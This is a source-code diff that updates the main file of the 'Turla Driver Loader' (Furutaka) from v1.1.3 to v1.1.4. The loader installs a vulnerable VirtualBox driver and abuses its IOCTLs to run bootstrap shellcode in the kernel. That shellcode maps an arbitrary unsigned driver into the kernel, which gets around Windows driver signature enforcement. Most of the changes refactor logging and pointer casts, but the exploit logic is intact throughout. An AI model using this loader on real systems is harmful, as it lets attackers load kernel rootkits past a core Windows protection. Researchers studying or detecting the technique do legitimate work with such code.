@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2016 - 2018
+*  (C) COPYRIGHT AUTHORS, 2016 - 2019
 *
 *  TITLE:       MAIN.C
 *
-*  VERSION:     1.13
+*  VERSION:     1.14
 *
-*  DATE:        09 Mar 2018
+*  DATE:        05 Jan 2019
 *
 *  Furutaka entry point.
 *
@@ -18,7 +18,6 @@
 *******************************************************************************/
 
 #include "global.h"
-#include <process.h>
 #include "vbox.h"
 #include "shellcode.h"
 
@@ -28,24 +27,21 @@ volatile LONG g_lApplicationInstances = 0;
 #pragma comment(linker, "/Section:shrd,RWS")
 
 HINSTANCE  g_hInstance;
-HANDLE     g_ConOut = NULL;
 HANDLE     g_hVBox = INVALID_HANDLE_VALUE;
-BOOL       g_ConsoleOutput = FALSE;
 BOOL       g_VBoxInstalled = FALSE;
-WCHAR      g_BE = 0xFEFF;
 
 ULONG      g_NtBuildNumber = 0;
 
 #define VBoxDrvSvc      TEXT("VBoxDrv")
 #define supImageName    "furutaka"
 #define supImageHandle  0x1a000
-#define PAGE_SIZE       0x1000
 
-#define T_LOADERTITLE   TEXT("Turla Driver Loader v1.1.3 (09/03/18)")
+#define T_LOADERTITLE   TEXT("Turla Driver Loader v1.1.4 (05/01/19)")
 #define T_LOADERUNSUP   TEXT("Unsupported WinNT version\r\n")
 #define T_LOADERRUN     TEXT("Another instance running, close it before\r\n")
-#define T_LOADERUSAGE   TEXT("Usage: loader drivertoload\n\re.g. loader mydrv.sys\r\n")
-#define T_LOADERINTRO   TEXT("Turla Driver Loader v1.1.3 started\r\n(c) 2016 - 2018 TDL Project\r\nSupported x64 OS : 7 and above\r\n")
+#define T_LOADERUSAGE   TEXT("Usage: loader DriverToLoad\n\re.g. loader mydrv.sys\r\n")
+#define T_LOADERINTRO   TEXT("Turla Driver Loader v1.1.4 started\r\n(c) 2016 - 2019 TDL Project\r\nSupported x64 OS : 7 and above\r\n")
+#define T_VBOXDETECT    TEXT("Ldr: Detected VirtualBox software installation, driver backup will be done")
 
 /*
 * TDLVBoxInstalled
@@ -149,7 +145,7 @@ ULONG_PTR TDLGetProcAddress(
     ULONG_PTR      pfn = 0;
 
     RtlInitString(&cStr, FunctionName);
-    if (!NT_SUCCESS(LdrGetProcedureAddress((PVOID)KernelImage, &cStr, 0, (PVOID)&pfn)))
+    if (!NT_SUCCESS(LdrGetProcedureAddress((PVOID)KernelImage, &cStr, 0, (PVOID*)&pfn)))
         return 0;
 
     return KernelBase + (pfn - KernelImage);
@@ -243,7 +239,7 @@ void TDLExploit(
             &Cookie, SUP_IOCTL_COOKIE_SIZE_IN, &Cookie,
             SUP_IOCTL_COOKIE_SIZE_OUT, &bytesIO, NULL))
         {
-            cuiPrintText(g_ConOut, TEXT("Ldr: SUP_IOCTL_COOKIE call failed"), g_ConsoleOutput, TRUE);
+            cuiPrintText(TEXT("Ldr: SUP_IOCTL_COOKIE call failed"), TRUE);
             break;
         }
 
@@ -261,19 +257,19 @@ void TDLExploit(
             SUP_IOCTL_LDR_OPEN_SIZE_IN, &OpenLdr,
             SUP_IOCTL_LDR_OPEN_SIZE_OUT, &bytesIO, NULL))
         {
-            cuiPrintText(g_ConOut, TEXT("Ldr: SUP_IOCTL_LDR_OPEN call failed"), g_ConsoleOutput, TRUE);
+            cuiPrintText(TEXT("Ldr: SUP_IOCTL_LDR_OPEN call failed"), TRUE);
             break;
         }
         else {
             _strcpy(text, TEXT("Ldr: OpenLdr.u.Out.pvImageBase = 0x"));
             u64tohex((ULONG_PTR)OpenLdr.u.Out.pvImageBase, _strend(text));
-            cuiPrintText(g_ConOut, text, g_ConsoleOutput, TRUE);
+            cuiPrintText(text, TRUE);
         }
 
         ImageBase = OpenLdr.u.Out.pvImageBase;
 
         memIO = PAGE_SIZE + CodeSize;
-        NtAllocateVirtualMemory(NtCurrentProcess(), &pLoadTask, 0, &memIO,
+        NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*)&pLoadTask, 0, &memIO,
             MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
         if (pLoadTask == NULL)
@@ -299,7 +295,7 @@ void TDLExploit(
             pLoadTask, pLoadTask->Hdr.cbIn,
             pLoadTask, SUP_IOCTL_LDR_LOAD_SIZE_OUT, &bytesIO, NULL))
         {
-            cuiPrintText(g_ConOut, TEXT("Ldr: SUP_IOCTL_LDR_LOAD call failed"), g_ConsoleOutput, TRUE);
+            cuiPrintText(TEXT("Ldr: SUP_IOCTL_LDR_LOAD call failed"), TRUE);
             break;
         }
         else {
@@ -310,7 +306,7 @@ void TDLExploit(
 
             _strcat(text, TEXT("\r\n\tDriver image mapped at 0x"));
             u64tohex((ULONG_PTR)ImageBase + DataOffset, _strend(text));
-            cuiPrintText(g_ConOut, text, g_ConsoleOutput, TRUE);
+            cuiPrintText(text, TRUE);
         }
 
         RtlSecureZeroMemory(&vmFast, sizeof(vmFast));
@@ -326,21 +322,21 @@ void TDLExploit(
             &vmFast, SUP_IOCTL_SET_VM_FOR_FAST_SIZE_IN,
             &vmFast, SUP_IOCTL_SET_VM_FOR_FAST_SIZE_OUT, &bytesIO, NULL))
         {
-            cuiPrintText(g_ConOut, TEXT("Ldr: SUP_IOCTL_SET_VM_FOR_FAST call failed"), g_ConsoleOutput, TRUE);
+            cuiPrintText(TEXT("Ldr: SUP_IOCTL_SET_VM_FOR_FAST call failed"), TRUE);
             break;
         }
         else {
-            cuiPrintText(g_ConOut, TEXT("Ldr: SUP_IOCTL_SET_VM_FOR_FAST call complete"), g_ConsoleOutput, TRUE);
+            cuiPrintText(TEXT("Ldr: SUP_IOCTL_SET_VM_FOR_FAST call complete"), TRUE);
         }
 
-        cuiPrintText(g_ConOut, TEXT("Ldr: SUP_IOCTL_FAST_DO_NOP"), g_ConsoleOutput, TRUE);
+        cuiPrintText(TEXT("Ldr: SUP_IOCTL_FAST_DO_NOP"), TRUE);
 
         paramOut = 0;
         DeviceIoControl(g_hVBox, SUP_IOCTL_FAST_DO_NOP,
             NULL, 0,
             &paramOut, sizeof(paramOut), &bytesIO, NULL);
 
-        cuiPrintText(g_ConOut, TEXT("Ldr: SUP_IOCTL_LDR_FREE"), g_ConsoleOutput, TRUE);
+        cuiPrintText(TEXT("Ldr: SUP_IOCTL_LDR_FREE"), TRUE);
 
         RtlSecureZeroMemory(&ldrFree, sizeof(ldrFree));
         ldrFree.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
@@ -360,7 +356,7 @@ void TDLExploit(
 
     if (pLoadTask != NULL) {
         memIO = 0;
-        NtFreeVirtualMemory(NtCurrentProcess(), &pLoadTask, &memIO, MEM_RELEASE);
+        NtFreeVirtualMemory(NtCurrentProcess(), (PVOID*)&pLoadTask, &memIO, MEM_RELEASE);
     }
 
     if (g_hVBox != INVALID_HANDLE_VALUE) {
@@ -400,19 +396,19 @@ UINT TDLMapDriver(
 
         _strcpy(text, TEXT("Ldr: Kernel base = 0x"));
         u64tohex(KernelBase, _strend(text));
-        cuiPrintText(g_ConOut, text, g_ConsoleOutput, TRUE);
+        cuiPrintText(text, TRUE);
 
         RtlSecureZeroMemory(&uStr, sizeof(uStr));
         RtlInitUnicodeString(&uStr, lpDriverFullName);
-        status = LdrLoadDll(NULL, &DllCharacteristics, &uStr, (PVOID)&Image);
+        status = LdrLoadDll(NULL, &DllCharacteristics, &uStr, (PVOID*)&Image);
         if ((!NT_SUCCESS(status)) || (Image == NULL)) {
-            cuiPrintText(g_ConOut, TEXT("Ldr: Error while loading input driver file"), g_ConsoleOutput, TRUE);
+            cuiPrintText(TEXT("Ldr: Error while loading input driver file"), TRUE);
             break;
         }
         else {
             _strcpy(text, TEXT("Ldr: Input driver file loaded at 0x"));
             u64tohex((ULONG_PTR)Image, _strend(text));
-            cuiPrintText(g_ConOut, text, g_ConsoleOutput, TRUE);
+            cuiPrintText(text, TRUE);
         }
 
         FileHeader = RtlImageNtHeader(Image);
@@ -421,69 +417,69 @@ UINT TDLMapDriver(
 
         isz = FileHeader->OptionalHeader.SizeOfImage;
 
-        cuiPrintText(g_ConOut, TEXT("Ldr: Loading ntoskrnl.exe"), g_ConsoleOutput, TRUE);
+        cuiPrintText(TEXT("Ldr: Loading ntoskrnl.exe"), TRUE);
 
         RtlInitUnicodeString(&uStr, L"ntoskrnl.exe");
-        status = LdrLoadDll(NULL, NULL, &uStr, (PVOID)&KernelImage);
+        status = LdrLoadDll(NULL, NULL, &uStr, (PVOID*)&KernelImage);
         if ((!NT_SUCCESS(status)) || (KernelImage == 0)) {
-            cuiPrintText(g_ConOut, TEXT("Ldr: Error while loading ntoskrnl.exe"), g_ConsoleOutput, TRUE);
+            cuiPrintText(TEXT("Ldr: Error while loading ntoskrnl.exe"), TRUE);
             break;
         }
         else {
             _strcpy(text, TEXT("Ldr: ntoskrnl.exe loaded at 0x"));
             u64tohex(KernelImage, _strend(text));
-            cuiPrintText(g_ConOut, text, g_ConsoleOutput, TRUE);
+            cuiPrintText(text, TRUE);
         }
 
         RtlInitString(&routineName, "ExAllocatePoolWithTag");
-        status = LdrGetProcedureAddress((PVOID)KernelImage, &routineName, 0, (PVOID)&xExAllocatePoolWithTag);
+        status = LdrGetProcedureAddress((PVOID)KernelImage, &routineName, 0, (PVOID*)&xExAllocatePoolWithTag);
         if ((!NT_SUCCESS(status)) || (xExAllocatePoolWithTag == 0)) {
-            cuiPrintText(g_ConOut, TEXT("Ldr: Error, ExAllocatePoolWithTag address not found"), g_ConsoleOutput, TRUE);
+            cuiPrintText(TEXT("Ldr: Error, ExAllocatePoolWithTag address not found"), TRUE);
             break;
         }
         else {
             _strcpy(text, TEXT("Ldr: ExAllocatePoolWithTag 0x"));
             u64tohex(KernelBase + (xExAllocatePoolWithTag - KernelImage), _strend(text));
-            cuiPrintText(g_ConOut, text, g_ConsoleOutput, TRUE);
+            cuiPrintText(text, TRUE);
         }
 
         if (g_NtBuildNumber < 15063) {
             RtlInitString(&routineName, "PsCreateSystemThread");
-            status = LdrGetProcedureAddress((PVOID)KernelImage, &routineName, 0, (PVOID)&xPsCreateSystemThread);
+            status = LdrGetProcedureAddress((PVOID)KernelImage, &routineName, 0, (PVOID*)&xPsCreateSystemThread);
             if ((!NT_SUCCESS(status)) || (xPsCreateSystemThread == 0)) {
-                cuiPrintText(g_ConOut, TEXT("Ldr: Error, PsCreateSystemThread address not found"), g_ConsoleOutput, TRUE);
+                cuiPrintText(TEXT("Ldr: Error, PsCreateSystemThread address not found"), TRUE);
                 break;
             }
             else {
                 _strcpy(text, TEXT("Ldr: PsCreateSystemThread 0x"));
                 u64tohex(KernelBase + (xPsCreateSystemThread - KernelImage), _strend(text));
-                cuiPrintText(g_ConOut, text, g_ConsoleOutput, TRUE);
+                cuiPrintText(text, TRUE);
             }
 
             RtlInitString(&routineName, "ZwClose");
-            status = LdrGetProcedureAddress((PVOID)KernelImage, &routineName, 0, (PVOID)&xZwClose);
+            status = LdrGetProcedureAddress((PVOID)KernelImage, &routineName, 0, (PVOID*)&xZwClose);
             if ((!NT_SUCCESS(status)) || (xZwClose == 0)) {
-                cuiPrintText(g_ConOut, TEXT("Ldr: Error, ZwClose address not found"), g_ConsoleOutput, TRUE);
+                cuiPrintText(TEXT("Ldr: Error, ZwClose address not found"), TRUE);
                 break;
             }
             else {
                 _strcpy(text, TEXT("Ldr: ZwClose 0x"));
                 u64tohex(KernelBase + (xZwClose - KernelImage), _strend(text));
-                cuiPrintText(g_ConOut, text, g_ConsoleOutput, TRUE);
+                cuiPrintText(text, TRUE);
             }
         }
 
         memIO = isz + PAGE_SIZE;
-        NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID)&Buffer, 0, &memIO,
+        NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*)&Buffer, 0, &memIO,
             MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
         if (Buffer == NULL) {
-            cuiPrintText(g_ConOut, TEXT("Ldr: Error, unable to allocate shellcode"), g_ConsoleOutput, TRUE);
+            cuiPrintText(TEXT("Ldr: Error, unable to allocate shellcode"), TRUE);
             break;
         }
         else {
             _strcpy(text, TEXT("Ldr: Shellcode allocated at 0x"));
             u64tohex((ULONG_PTR)Buffer, _strend(text));
-            cuiPrintText(g_ConOut, text, g_ConsoleOutput, TRUE);
+            cuiPrintText(text, TRUE);
         }
 
         // mov rcx, ExAllocatePoolWithTag
@@ -516,20 +512,20 @@ UINT TDLMapDriver(
         if (g_NtBuildNumber < 15063) {
             RtlCopyMemory(Buffer + prologueSize,
                 TDLBootstrapLoader_code, sizeof(TDLBootstrapLoader_code));
-            cuiPrintText(g_ConOut, TEXT("Ldr: Default bootstrap shellcode selected"), g_ConsoleOutput, TRUE);
+            cuiPrintText(TEXT("Ldr: Default bootstrap shellcode selected"), TRUE);
         }
         else {
             RtlCopyMemory(Buffer + prologueSize,
                 TDLBootstrapLoader_code_w10rs2, sizeof(TDLBootstrapLoader_code_w10rs2));
-            cuiPrintText(g_ConOut, TEXT("Ldr: Windows 10 RS2+ bootstrap shellcode selected"), g_ConsoleOutput, TRUE);
+            cuiPrintText(TEXT("Ldr: Windows 10 RS2+ bootstrap shellcode selected"), TRUE);
         }
 
         RtlCopyMemory(Buffer + dataOffset, Image, isz);
 
-        cuiPrintText(g_ConOut, TEXT("Ldr: Resolving kernel import"), g_ConsoleOutput, TRUE);
+        cuiPrintText(TEXT("Ldr: Resolving kernel import"), TRUE);
         TDLResolveKernelImport((ULONG_PTR)Buffer + dataOffset, KernelImage, KernelBase);
 
-        cuiPrintText(g_ConOut, TEXT("Ldr: Executing exploit"), g_ConsoleOutput, TRUE);
+        cuiPrintText(TEXT("Ldr: Executing exploit"), TRUE);
         TDLExploit(Buffer, isz + PAGE_SIZE, dataOffset);
         result = 0;
         break;
@@ -537,7 +533,7 @@ UINT TDLMapDriver(
 
     if (Buffer != NULL) {
         memIO = 0;
-        NtFreeVirtualMemory(NtCurrentProcess(), &Buffer, &memIO, MEM_RELEASE);
+        NtFreeVirtualMemory(NtCurrentProcess(), (PVOID*)&Buffer, &memIO, MEM_RELEASE);
     }
 
     return result;
@@ -568,11 +564,7 @@ HANDLE TDLStartVulnerableDriver(
         //lets give scm nice looking path so this piece of shit code from early 90x wont fuckup somewhere.
         RtlSecureZeroMemory(szDriverFileName, sizeof(szDriverFileName));
         if (!GetSystemDirectory(szDriverFileName, MAX_PATH)) {
-
-            cuiPrintText(g_ConOut,
-                TEXT("Ldr: Error loading VirtualBox driver, GetSystemDirectory failed"),
-                g_ConsoleOutput, TRUE);
-
+            cuiPrintText(TEXT("Ldr: Error loading VirtualBox driver, GetSystemDirectory failed"), TRUE);
             break;
         }
 
@@ -581,39 +573,37 @@ HANDLE TDLStartVulnerableDriver(
             SC_MANAGER_ALL_ACCESS
         );
         if (schSCManager == NULL) {
-            cuiPrintText(g_ConOut,
-                TEXT("Ldr: Error opening SCM database"),
-                g_ConsoleOutput, TRUE);
-
+            cuiPrintText(TEXT("Ldr: Error opening SCM database"), TRUE);
             break;
         }
 
         //lookup main vbox driver device, if found, try to unload all possible, unload order is sensitive
         if (supIsObjectExists(L"\\Device", L"VBoxDrv")) {
-            cuiPrintText(g_ConOut,
-                TEXT("Ldr: Active VirtualBox found in system, attempt unload it"),
-                g_ConsoleOutput, TRUE);
+
+            cuiPrintText(TEXT("Ldr: Active VirtualBox found in system, attempt unload it"), TRUE);
 
             if (scmStopDriver(schSCManager, TEXT("VBoxNetAdp"))) {
-                cuiPrintText(g_ConOut,
-                    TEXT("SCM: VBoxNetAdp driver unloaded"),
-                    g_ConsoleOutput, TRUE);
+
+                cuiPrintText(TEXT("SCM: VBoxNetAdp driver unloaded"), TRUE);
+
             }
             if (scmStopDriver(schSCManager, TEXT("VBoxNetLwf"))) {
-                cuiPrintText(g_ConOut,
-                    TEXT("SCM: VBoxNetLwf driver unloaded"),
-                    g_ConsoleOutput, TRUE);
+
+                cuiPrintText(TEXT("SCM: VBoxNetLwf driver unloaded"), TRUE);
+
             }
             if (scmStopDriver(schSCManager, TEXT("VBoxUSBMon"))) {
-                cuiPrintText(g_ConOut,
-                    TEXT("SCM: VBoxUSBMon driver unloaded"),
-                    g_ConsoleOutput, TRUE);
+
+                cuiPrintText(TEXT("SCM: VBoxUSBMon driver unloaded"), TRUE);
+
             }
+
             Sleep(1000);
+
             if (scmStopDriver(schSCManager, TEXT("VBoxDrv"))) {
-                cuiPrintText(g_ConOut,
-                    TEXT("SCM: VBoxDrv driver unloaded"),
-                    g_ConsoleOutput, TRUE);
+
+                cuiPrintText(TEXT("SCM: VBoxDrv driver unloaded"), TRUE);
+
             }
         }
 
@@ -623,9 +613,10 @@ HANDLE TDLStartVulnerableDriver(
         //
         if (g_VBoxInstalled) {
             if (supBackupVBoxDrv(FALSE) == FALSE) {
-                cuiPrintText(g_ConOut,
-                    TEXT("Ldr: Error while doing VirtualBox driver backup"),
-                    g_ConsoleOutput, TRUE);
+                cuiPrintText(TEXT("Ldr: Error while doing VirtualBox driver backup"), TRUE);
+            }
+            else {
+                cuiPrintText(TEXT("Ldr: VirtualBox driver backup done"), TRUE);
             }
         }
 
@@ -635,11 +626,7 @@ HANDLE TDLStartVulnerableDriver(
             (SIZE_T)DataSize, FALSE, FALSE);
 
         if (bytesIO != DataSize) {
-
-            cuiPrintText(g_ConOut,
-                TEXT("Ldr: Error writing VirtualBox on disk"),
-                g_ConsoleOutput, TRUE);
-
+            cuiPrintText(TEXT("Ldr: Error writing VirtualBox on disk"), TRUE);
             break;
         }
 
@@ -661,7 +648,7 @@ HANDLE TDLStartVulnerableDriver(
             msg = TEXT("SCM: Vulnerable driver load failure");
         }
 
-        cuiPrintText(g_ConOut, msg, g_ConsoleOutput, TRUE);
+        cuiPrintText(msg, TRUE);
         break;
     }
 
@@ -689,9 +676,7 @@ void TDLStopVulnerableDriver(
     UNICODE_STRING     uStr;
     OBJECT_ATTRIBUTES  ObjectAttributes;
 
-    cuiPrintText(g_ConOut,
-        TEXT("SCM: Unloading vulnerable driver"),
-        g_ConsoleOutput, TRUE);
+    cuiPrintText(TEXT("SCM: Unloading vulnerable driver"), TRUE);
 
     if (g_hVBox != INVALID_HANDLE_VALUE)
         CloseHandle(g_hVBox);
@@ -702,9 +687,7 @@ void TDLStopVulnerableDriver(
     );
 
     if (schSCManager == NULL) {
-        cuiPrintText(g_ConOut,
-            TEXT("SCM: Cannot open database, unable unload driver"),
-            g_ConsoleOutput, TRUE);
+        cuiPrintText(TEXT("SCM: Cannot open database, unable unload driver"), TRUE);
         return;
     }
 
@@ -714,7 +697,7 @@ void TDLStopVulnerableDriver(
     else
         msg = TEXT("SCM: Unexpected error while unloading driver");
 
-    cuiPrintText(g_ConOut, msg, g_ConsoleOutput, TRUE);
+    cuiPrintText(msg, TRUE);
 
     //if VBox not installed - remove from scm database and delete file
     if (g_VBoxInstalled == FALSE) {
@@ -724,7 +707,7 @@ void TDLStopVulnerableDriver(
         else
             msg = TEXT("SCM: Error removing driver entry from registry");
 
-        cuiPrintText(g_ConOut, msg, g_ConsoleOutput, TRUE);
+        cuiPrintText(msg, TRUE);
 
         uStr.Buffer = NULL;
         uStr.Length = 0;
@@ -736,17 +719,17 @@ void TDLStopVulnerableDriver(
         else
             msg = TEXT("Ldr: Error removing driver file");
 
-        cuiPrintText(g_ConOut, msg, g_ConsoleOutput, TRUE);
+        cuiPrintText(msg, TRUE);
 
     }
     else {
         //VBox software present, restore original driver and exit
         if (supBackupVBoxDrv(TRUE))
-            msg = TEXT("Ldr: Original driver restored");
+            msg = TEXT("Ldr: Original VirtualBox driver restored from backup");
         else
-            msg = TEXT("Ldr: Unexpected error while restoring original driver");
+            msg = TEXT("Ldr: Unexpected error while restoring original driver from backup");
 
-        cuiPrintText(g_ConOut, msg, g_ConsoleOutput, TRUE);
+        cuiPrintText(msg, TRUE);
     }
     CloseServiceHandle(schSCManager);
 }
@@ -772,9 +755,7 @@ UINT TDLProcessCommandLine(
     RtlSecureZeroMemory(szInputFile, sizeof(szInputFile));
     GetCommandLineParam(lpCommandLine, 1, (LPWSTR)&szInputFile, MAX_PATH, &c);
     if (c == 0) {
-        cuiPrintText(g_ConOut,
-            T_LOADERUSAGE,
-            g_ConsoleOutput, FALSE);
+        cuiPrintText(T_LOADERUSAGE, FALSE);
         return retVal;
     }
 
@@ -786,9 +767,7 @@ UINT TDLProcessCommandLine(
         }
     }
     else {
-        cuiPrintText(g_ConOut,
-            TEXT("Ldr: Input file not found"),
-            g_ConsoleOutput, FALSE);
+        cuiPrintText(TEXT("Ldr: Input file not found"), FALSE);
     }
     return retVal;
 }
@@ -806,43 +785,23 @@ void TDLMain()
 
     BOOL            cond = FALSE;
     UINT            uResult = 0;
-    DWORD           dwTemp;
     LONG            x;
     OSVERSIONINFO   osv;
     WCHAR           text[256];
-
-    __security_init_cookie();
 
     do {
 
         g_hInstance = GetModuleHandle(NULL);
 
-        g_ConOut = GetStdHandle(STD_OUTPUT_HANDLE);
-        if (g_ConOut == INVALID_HANDLE_VALUE) {
-            uResult = (UINT)-1;
-            break;
-        }
-
-        g_ConsoleOutput = TRUE;
-        if (!GetConsoleMode(g_ConOut, &dwTemp)) {
-            g_ConsoleOutput = FALSE;
-        }
+        cuiInitialize(FALSE, NULL);
 
         SetConsoleTitle(T_LOADERTITLE);
-        SetConsoleMode(g_ConOut, ENABLE_LINE_INPUT | ENABLE_ECHO_INPUT | ENABLE_PROCESSED_OUTPUT);
-        if (g_ConsoleOutput == FALSE) {
-            WriteFile(g_ConOut, &g_BE, sizeof(WCHAR), &dwTemp, NULL);
-        }
 
-        cuiPrintText(g_ConOut,
-            T_LOADERINTRO,
-            g_ConsoleOutput, TRUE);
+        cuiPrintText(T_LOADERINTRO, TRUE);
 
         x = InterlockedIncrement((PLONG)&g_lApplicationInstances);
         if (x > 1) {
-            cuiPrintText(g_ConOut,
-                T_LOADERRUN,
-                g_ConsoleOutput, FALSE);
+            cuiPrintText(T_LOADERRUN, FALSE);
             uResult = (UINT)-1;
             break;
         }
@@ -852,9 +811,7 @@ void TDLMain()
         osv.dwOSVersionInfoSize = sizeof(osv);
         RtlGetVersion((PRTL_OSVERSIONINFOW)&osv);
         if (osv.dwMajorVersion < 6) {
-            cuiPrintText(g_ConOut,
-                T_LOADERUNSUP,
-                g_ConsoleOutput, FALSE);
+            cuiPrintText(T_LOADERUNSUP, FALSE);
             uResult = (UINT)-1;
             break;
         }
@@ -867,19 +824,16 @@ void TDLMain()
         ultostr(osv.dwMinorVersion, _strend(text));
         _strcat(text, TEXT(" build "));
         ultostr(osv.dwBuildNumber, _strend(text));
-        cuiPrintText(g_ConOut, text, g_ConsoleOutput, TRUE);
-#if 0
+        cuiPrintText(text, TRUE);
+
         //
         // If VirtualBox installed on the same machine warn user,
         // however this is unnecessary can lead to any conflicts.
         //
         g_VBoxInstalled = TDLVBoxInstalled();
         if (g_VBoxInstalled) {
-            cuiPrintText(g_ConOut,
-                TEXT("Ldr: Warning, VirtualBox software installed, conflicts are possible"),
-                g_ConsoleOutput, TRUE);
+            cuiPrintText(T_VBOXDETECT, TRUE);
         }
-#endif
 
         uResult = TDLProcessCommandLine(GetCommandLine());
 
